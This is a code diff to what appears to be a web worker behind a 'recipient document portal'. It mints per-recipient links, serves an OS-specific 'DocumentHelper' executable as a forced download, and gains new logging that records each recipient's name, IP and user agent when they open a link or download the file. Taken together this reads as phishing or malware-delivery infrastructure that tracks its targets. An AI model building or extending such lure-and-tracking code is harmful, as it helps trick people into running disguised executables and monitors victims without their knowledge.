@@ -26,6 +26,23 @@ function getCookie(req, name) {
   return m ? decodeURIComponent(m[1]) : '';
 }
 
+// /sender mints one link per recipient at /f/<token>?to=<name>; the name never
+// reaches the server unless it is forwarded, and it is the only attribution we
+// have for a shared token. Same sanitising rules the portal applies.
+function recipientName(u) {
+  const v = u.searchParams.get('to') || u.searchParams.get('email') || '-';
+  return String(v).replace(/[\u0000-\u001f]/g, '').trim()
+    .replace(/\s+/g, ' ').slice(0, 64) || '-';
+}
+
+function logEvent(req, u, ua, evt, extra) {
+  console.log(JSON.stringify(Object.assign({
+    ts: Date.now(), evt,
+    ip: req.headers.get('cf-connecting-ip'),
+    ua, to: recipientName(u)
+  }, extra)));
+}
+
 function loginPage(message) {
   const html = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -109,10 +126,7 @@ export default {
               : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper.pkg'
               : /Linux|X11/i.test(ua)          ? 'DocumentHelper.run'
               : 'DocumentHelper.exe';
-      console.log(JSON.stringify({
-        ts: Date.now(), ip: req.headers.get('cf-connecting-ip'),
-        ua, file: f, path: p
-      }));
+      logEvent(req, u, ua, 'pick', { file: f, path: p });
       return new Response(null, {
         status: 302,
         headers: { Location: '/dl/' + f, 'Cache-Control': 'no-store' }
@@ -120,6 +134,10 @@ export default {
     }
 
     if (p.startsWith('/dl/')) {
+      // Also log direct artifact hits: a link pasted from a previous message can
+      // skip /get entirely, and that is exactly the download we would otherwise
+      // have no attribution for.
+      logEvent(req, u, ua, 'download', { file: p.slice(4), path: p });
       const r = await env.ASSETS.fetch(req);
       const h = new Headers(r.headers);
       h.set('Content-Disposition', 'attachment');
@@ -130,6 +148,7 @@ export default {
 
     // --- Recipient document portal ---
     if (/^\/f\/[A-Za-z0-9_-]+$/.test(p)) {
+      logEvent(req, u, ua, 'open', { path: p, code: p.slice(3) });
       return env.ASSETS.fetch(new URL('/index.html', u));
     }
 
